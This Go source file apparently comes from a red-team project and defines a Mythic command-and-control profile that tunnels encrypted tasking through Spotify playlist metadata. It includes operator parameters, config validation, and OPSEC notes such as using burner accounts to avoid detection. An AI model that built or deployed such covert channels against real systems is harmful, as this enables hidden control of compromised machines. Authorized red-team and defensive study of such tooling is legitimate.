// Package c2functions defines the "spotify" Mythic C2 profile: its
// definition, user-configurable parameters, and the ConfigCheck/OPSECCheck
// callbacks Mythic invokes from the UI.
package c2functions

import (
	"fmt"
	"strings"

	c2structs "github.com/MythicMeta/MythicContainer/c2_structs"
)

// ProfileName is the Mythic-internal name of this C2 profile.
const ProfileName = "spotify"

// minPollIntervalSeconds is the smallest poll interval ConfigCheck accepts.
// Polling faster than this risks Spotify API rate limiting.
const minPollIntervalSeconds = 20

// Definition returns the C2Profile registered with Mythic.
func Definition() c2structs.C2Profile {
	return c2structs.C2Profile{
		Name:                ProfileName,
		Description:         "C2 over Spotify playlist metadata. Tasking is chunked/encrypted into playlist descriptions on shared cmd/res channels; the dumb-pipe transport carries opaque Mythic envelopes.",
		Author:              "@sourcefrenchy",
		IsP2p:               false,
		IsServerRouted:      true,
		ServerBinaryPath:    "/spotify_server", // this binary IS the server (SDK requires the field)
		SemVer:              "0.1.0",
		ConfigCheckFunction: configCheck,
		OPSECCheckFunction:  opsecCheck,
	}
}

// Parameters returns the user-configurable parameters for the profile.
func Parameters() []c2structs.C2Parameter {
	return []c2structs.C2Parameter{
		{
			Name:          "AESPSK",
			Description:   "Mythic crypto type for agent messages. The key is generated per-payload by Mythic; the Spotify transport treats messages as opaque envelopes.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_CHOOSE_ONE,
			IsCryptoType:  true,
			DefaultValue:  "aes256_hmac",
			Choices:       []string{"aes256_hmac", "none"},
			Required:      true,
			UiPosition:    0,
		},
		{
			Name:          "callback_host",
			Description:   "Unused by this server-routed profile (agents never talk to Mythic directly); kept for payload-build convention.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			DefaultValue:  "https://open.spotify.com",
			Required:      false,
			UiPosition:    1,
		},
		{
			Name:          "spotify_username",
			Description:   "Spotify account username that owns the C2 playlists.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			Required:      true,
			UiPosition:    2,
		},
		{
			Name:          "spotify_client_id",
			Description:   "Spotify Developer app client ID.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			Required:      true,
			UiPosition:    3,
		},
		{
			Name:          "spotify_client_secret",
			Description:   "Spotify Developer app client secret.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			Required:      true,
			UiPosition:    4,
		},
		{
			Name:          "spotify_redirect_uri",
			Description:   "OAuth redirect URI registered on the Spotify Developer app (only needed when (re)acquiring a token interactively).",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			DefaultValue:  "http://127.0.0.1:8888/callback",
			Required:      false,
			UiPosition:    5,
		},
		{
			Name:          "spotify_token_file",
			Description:   "Path (inside the container) to a spotipy-format token JSON cache used for non-interactive auth. Recommended for a headless container.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			DefaultValue:  "",
			Required:      false,
			UiPosition:    6,
		},
		{
			Name:          "passphrase",
			Description:   "Shared passphrase protecting the cmd/res transport playlists. MUST exactly match the passphrase compiled into the agent build, or neither side can read the channels.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
			Required:      true,
			UiPosition:    7,
		},
		{
			Name:          "poll_interval",
			Description:   "Seconds between polls of the agent response channel. Minimum 20 to stay clear of Spotify API rate limits.",
			ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER,
			DefaultValue:  30,
			Required:      true,
			UiPosition:    8,
		},
	}
}

// configCheck validates the operator-supplied parameters before the profile
// is enabled on a payload.
func configCheck(message c2structs.C2ConfigCheckMessage) c2structs.C2ConfigCheckMessageResponse {
	resp := c2structs.C2ConfigCheckMessageResponse{Success: true}

	for _, name := range []string{
		"spotify_username",
		"spotify_client_id",
		"spotify_client_secret",
		"passphrase",
	} {
		v, err := message.GetStringArg(name)
		if err != nil || strings.TrimSpace(v) == "" {
			resp.Success = false
			resp.Error = fmt.Sprintf("parameter %q is required and must be non-empty", name)
			return resp
		}
	}

	interval, err := message.GetNumberArg("poll_interval")
	if err != nil {
		resp.Success = false
		resp.Error = fmt.Sprintf("poll_interval must be a number: %v", err)
		return resp
	}
	if interval < minPollIntervalSeconds {
		resp.Success = false
		resp.Error = fmt.Sprintf("poll_interval must be >= %d seconds (Spotify API rate limits)", minPollIntervalSeconds)
		return resp
	}

	return resp
}

// opsecCheck warns about the operational tradeoffs of this profile. It never
// blocks a build.
func opsecCheck(message c2structs.C2OPSECMessage) c2structs.C2OPSECMessageResponse {
	notes := []string{
		"All agents and the profile share the same Spotify account: every operator and implant can see every C2 playlist. Compromise of one agent's passphrase exposes the whole channel history.",
		"Playlist churn (create/update/delete every poll cycle) is highly anomalous on a consumer Spotify account; use a burner account, not one tied to a real identity or payment method.",
		"cmd/res playlist contents are encrypted with the transport passphrase, but playlist names/timing/metadata are visible to Spotify.",
	}
	if v, err := message.GetStringArg("passphrase"); err == nil && len(v) < 16 {
		notes = append(notes, "The transport passphrase is short (<16 chars); prefer a long random passphrase.")
	}
	return c2structs.C2OPSECMessageResponse{
		Success: true,
		Message: strings.Join(notes, "\n"),
	}
}
